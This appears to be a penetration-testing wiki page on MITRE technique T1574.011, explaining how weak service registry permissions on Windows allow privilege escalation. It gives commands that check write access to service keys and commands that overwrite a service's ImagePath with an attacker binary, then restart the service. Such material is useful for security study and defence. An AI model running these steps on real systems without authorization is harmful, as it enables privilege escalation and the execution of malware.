---
description: MITRE ATT&CK™ Hijack Execution Flow - Services Registry Permissions Weakness - Technique T1574.011
---

# Weak Registry Permissions

## Theory

By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. Attackers may use weaknesses in registry permissions to divert from the initially stated executable to one they control upon Service start, allowing them to execute their unauthorized malware.

## Practice

An attacker can leverage this misconfiguration to modify the ImagePath of service with the path of the custom malicious executable that will give an escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

{% tabs %}
{% tab title="Enumerate" %}
We can check our permissions over services registry doing:
```powershell
#Get the binary paths of the services
reg query hklm\System\CurrentControlSet\Services /s /v imagepath

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

#With PowerShell
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName> | fl
```
Alternativly, we can use [AccessChk](https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk) from sysinternals tools to enum permissions over services.
```powershell
#List rights for authenticated users on registry
accesschk64.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services

#List everyone rights on registry
accesschk64.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services

#List everyone rights on specific service registry
accesschk64.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services\<Name>
```

Or we can use the `servicesinfo` module of [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```powershell
winPEASx64.exe servicesinfo
```
{% endtab %}

{% tab title="Exploit" %}
To change the path of th binary
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

And then, restart the service
```powershell
#Using wmic
wmic service <Service_Name> call stopservice
wmic service <Service_Name> call startservice

#Using net
net stop <Service_Name> && net start <Service_Name>

#Using sc.exe
sc stop <Service_Name>
sc start <Service_Name>
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions" %}